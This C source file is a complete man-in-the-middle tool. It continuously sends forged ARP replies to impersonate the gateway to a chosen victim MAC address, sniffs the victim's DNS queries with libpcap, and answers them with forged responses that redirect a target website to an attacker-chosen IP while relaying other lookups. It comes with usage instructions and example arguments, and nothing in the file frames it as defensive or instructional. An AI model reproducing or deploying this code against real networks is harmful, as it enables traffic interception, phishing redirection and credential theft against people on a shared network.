#include <libnet.h>
#include <stdlib.h>
#include <pcap.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <linux/if_ether.h>
#include <arpa/nameser.h>
#include <resolv.h>

#define COLOR_RED "\x1b[31m"
#define COLOR_GREEN "\x1b[32m"
#define COLOR_RESET "\x1b[0m"

char *interface_name;        // Name of the interface on which sniffing will be done and through which fake packes will be sent eg. "wlo1"
char *gateway_ip_addr;       // IP address of the gateway eg. "192.168.0.1"
char *website_to_spoof;      // Website which will be spoofed eg. "www.github.com"
char *redirect_addr;         // Website url or ip address which will be send instead of the website's eg. "192.168.0.47" or "www.guthib.com"
u_long redirect_ip_addr;     // IP address of the redirect_addr
u_int8_t source_mac_addr[6]; // MAC address of "interface_name"
u_int8_t victim_hw_addr[6];  // MAC address of the victim

struct saved_ip
{
  char *domain;
  u_long ip_addr;
  struct saved_ip *next;
};

struct saved_ip *head = NULL;

/**
 * Returns ip addres for given domain if found in the saved_ip list else returns 0
 */
u_long get_ip_addr(char *domain)
{
  struct saved_ip *curr = head;
  while (curr != NULL)
  {
    if (strcmp(curr->domain, domain) == 0)
    {
      return curr->ip_addr;
    }
    curr = curr->next;
  }
  return 0;
}

/**
 * Adds given domain and ip address to the saved_ip list
 */
void add_ip_addr(char *domain, u_long ip_addr)
{
  struct saved_ip *new_saved_ip = (struct saved_ip *)malloc(sizeof(struct saved_ip));
  new_saved_ip->domain = (char *)malloc(strlen(domain) + 1);
  strcpy(new_saved_ip->domain, domain);
  new_saved_ip->ip_addr = ip_addr;
  new_saved_ip->next = head;
  head = new_saved_ip;
}

/**
 * Checks whether user provided all arguments and run the program as root.
 * If not appropriate error message is displayed and program is terminated.
 *
 * @param argc number of arguments
 * @param argv array of arguments
 */
void check_prerequisites(int argc, char **argv)
{
  const int is_user_root = getuid() == 0;
  if (!is_user_root)
  {
    fprintf(stderr, COLOR_RED "You must be root to run this program." COLOR_RESET "\n");
    exit(EXIT_FAILURE);
  }

  const int are_all_args_provided = argc == 6;
  if (!are_all_args_provided)
  {
    fprintf(
        stderr,
        COLOR_RED "Missing Arguments.\n" COLOR_RESET
                  "Usage: %s INTERFACE_NAME GATEWAY_IP_ADDR WEBSITE_ADDR REDIRECT_IP_ADDR VICTIMS_MAC\n"
                  "Example: %s wlo1 192.168.0.1 www.github.com 192.168.0.47 a8:44:12:13:g2:1b\n",
        argv[0],
        argv[0]);
    exit(EXIT_FAILURE);
  }
}
/**
 * Contiously sends fake ARP responses.This function has to be started in a separate thread,
 * because it contains an inifite loop.
 */
void *start_arp_poisoning()
{
  libnet_t *ln;
  u_int32_t target_ip_addr, zero_ip_addr;

  struct libnet_ether_addr *src_hw_addr;
  char errbuf[LIBNET_ERRBUF_SIZE];

  ln = libnet_init(LIBNET_LINK, interface_name, errbuf);
  src_hw_addr = libnet_get_hwaddr(ln);
  target_ip_addr = libnet_name2addr4(ln, gateway_ip_addr, LIBNET_RESOLVE);
  zero_ip_addr = libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE);
  libnet_autobuild_arp(
      ARPOP_REPLY,                   /* operation type       */
      src_hw_addr->ether_addr_octet, /* sender hardware addr */
      (u_int8_t *)&target_ip_addr,   /* gateway ip addr      */
      victim_hw_addr,                /* victim hardware addr */
      (u_int8_t *)&zero_ip_addr,     /* victim protocol addr */
      ln);                           /* libnet context       */
  libnet_autobuild_ethernet(
      victim_hw_addr, /* ethernet destination */
      ETHERTYPE_ARP,  /* ethertype            */
      ln);            /* libnet context       */

  // Save mac address
  for (int i = 0; i < 6; i++)
  {
    source_mac_addr[i] = src_hw_addr->ether_addr_octet[i];
  }

  printf(COLOR_GREEN "Sending ARP packets..." COLOR_RESET "\n");
  while (1)
  {
    libnet_write(ln);
    sleep(5);
  }
  libnet_destroy(ln);
  return NULL;
}

//===================================================
// DNS sniffing and spoofing
//===================================================
char *errbuf;
pcap_t *handle;

void cleanup()
{
  pcap_close(handle);
  free(errbuf);
}

void stop(int signo)
{
  exit(EXIT_SUCCESS);
}
/**
 * Creates a fake dns response and sends it back to the client.
 */
void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
{
  struct ethhdr *eth_header;
  struct iphdr *ip_header;
  struct udphdr *udp_header;
  char *dns_header; // It could be a struct "dnshdr", but it's easier to just use char*
  char *dns_query;

  eth_header = (struct ethhdr *)bytes;
  ip_header = (struct iphdr *)(bytes + ETH_HLEN);
  udp_header = (struct udphdr *)(bytes + ETH_HLEN + LIBNET_IPV4_H);
  dns_header = (char *)(bytes + ETH_HLEN + LIBNET_IPV4_H + LIBNET_UDP_H);
  dns_query = (char *)(bytes + ETH_HLEN + LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H);

  // Check if this packet was send by this program and if so do not process it because it
  // most likely was send by libnet_name2addr4() function.
  int was_sent_by_this_program = 1;
  for (int i = 0; i < 6; i++)
  {
    if (eth_header->h_source[i] != source_mac_addr[i])
    {
      was_sent_by_this_program = 0;
      break;
    }
  }
  if (was_sent_by_this_program)
    return;

  int dns_query_len = strlen(dns_query);

  // Extract domain name from dns_query, because it is packed and thus it cannot be used directly.
  char domain_name[128];
  char *dns_query_backup = dns_query;
  if (dn_expand((u_char *)dns_header, bytes + h->caplen, (unsigned char *)dns_query, domain_name, sizeof(domain_name)) < 0)
  {
    return;
  }
  // "dn_expand" changes given pointer so it needs to be restored
  dns_query = dns_query_backup;

  // If dns request is for wanted site then use fake ip addres
  domain_name[dns_query_len - 1] = '\0';
  libnet_t *handler = NULL;
  u_long requested_ip_addr = redirect_ip_addr;
  int domain_name_matches_website = (strncmp(website_to_spoof, domain_name, strlen(website_to_spoof) - 1) == 0);
  uint16_t dns_id = dns_header[0] << 8 | (dns_header[1] & 255);
  if (!domain_name_matches_website)
  {
    requested_ip_addr = get_ip_addr(domain_name);
    if (requested_ip_addr == 0)
    {
      handler = libnet_init(LIBNET_LINK, interface_name, errbuf);
      requested_ip_addr = libnet_name2addr4(handler, domain_name, LIBNET_RESOLVE);
      libnet_destroy(handler);
      add_ip_addr(domain_name, requested_ip_addr);
    }
  }

  char dns_response[1024];

  // Create response
  memcpy(dns_response, dns_query, dns_query_len + 5);
  // Set type, class and TTL
  memcpy(dns_response + dns_query_len + 5, "\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\xff\x00\x04", 12);
  *((u_long *)(dns_response + dns_query_len + 5 + 12)) = requested_ip_addr;
  int dns_response_size = dns_query_len + 5 + 12 + 4;
  int packet_size = dns_response_size + LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H;

  handler = libnet_init(LIBNET_RAW4, interface_name, errbuf);
  libnet_ptag_t dns_ptag = 0, udp_ptag = 0, ip_ptag = 0, eth_ptag = 0;

  // Build all the layers

  libnet_build_dnsv4(
      LIBNET_UDP_DNSV4_H,
      dns_id,
      0x8180,
      1,
      1,
      0,
      0,
      (unsigned char *)dns_response,
      dns_response_size,
      handler,
      dns_ptag);
  if (dns_ptag == -1)
  {
    printf("Building DNS header failed: %s\n", libnet_geterror(handler));
    exit(1);
  }

  libnet_build_udp(
      ntohs(udp_header->dest),
      ntohs(udp_header->source),
      dns_response_size + LIBNET_DNS_H + LIBNET_UDP_H,
      0,
      NULL,
      0,
      handler,
      udp_ptag);
  if (udp_ptag == -1)
  {
    printf("Building UDP header failed: %s\n", libnet_geterror(handler));
    exit(1);
  }

  libnet_build_ipv4(
      packet_size,
      0,
      6888,
      0,
      60,
      IPPROTO_UDP,
      0,
      ip_header->daddr,
      ip_header->saddr,
      NULL,
      0,
      handler,
      ip_ptag);
  if (ip_ptag == -1)
  {
    printf("Building IP header failed: %s\n", libnet_geterror(handler));
    exit(1);
  }

  libnet_build_ethernet(
      eth_header->h_source,
      eth_header->h_dest,
      ETHERTYPE_IP,
      NULL,
      0,
      handler,
      eth_ptag);
  if (eth_ptag == -1)
  {
    printf("Building Ethernet header failed: %s\n", libnet_geterror(handler));
    exit(1);
  }

  int inject_size = libnet_write(handler);

  if (inject_size == -1)
  {
    printf("Write failed: %s\n", libnet_geterror(handler));
  }

  libnet_destroy(handler);
}
/**
 * Sets up libpcap and starts sniffing for dns packets. When a dns packet is sniffed, it calls the
 * trap function. This function has to be started in a separate thread, because "pcap_loop" blocks.
 */
void *sniff_and_fake_dns_packets()
{
  bpf_u_int32 netp, maskp;
  struct bpf_program fp;

  atexit(cleanup);
  signal(SIGINT, stop);
  errbuf = malloc(PCAP_ERRBUF_SIZE);
  handle = pcap_create(interface_name, errbuf);
  pcap_set_promisc(handle, 1);
  pcap_set_snaplen(handle, 65535);
  pcap_set_timeout(handle, 1000);
  pcap_activate(handle);
  pcap_lookupnet(interface_name, &netp, &maskp, errbuf);
  pcap_compile(handle, &fp, "udp dst port 53", 0, maskp);
  if (pcap_setfilter(handle, &fp) < 0)
  {
    pcap_perror(handle, "pcap_setfilter()");
    exit(EXIT_FAILURE);
  }
  pcap_loop(handle, -1, trap, NULL);
  return NULL;
}
//===================================================
int main(int argc, char **argv)
{
  check_prerequisites(argc, argv);

  interface_name = argv[1];
  gateway_ip_addr = argv[2];
  website_to_spoof = argv[3];
  redirect_addr = argv[4];
  char *victim_hw_addr_str = argv[5];

  // Convert victim_hw_addr_str from string to binary representation
  for (int i = 0; i < 6; i++)
  {
    victim_hw_addr[i] = (unsigned char)strtol(victim_hw_addr_str + i * 3, NULL, 16);
  }

  redirect_ip_addr = libnet_name2addr4(NULL, redirect_addr, LIBNET_RESOLVE);

  pthread_t pth1, pth2;

  pthread_create(&pth1, NULL, sniff_and_fake_dns_packets, NULL);
  pthread_create(&pth2, NULL, start_arp_poisoning, NULL);

  pthread_join(pth1, NULL);
  pthread_join(pth2, NULL);

  return EXIT_SUCCESS;
}
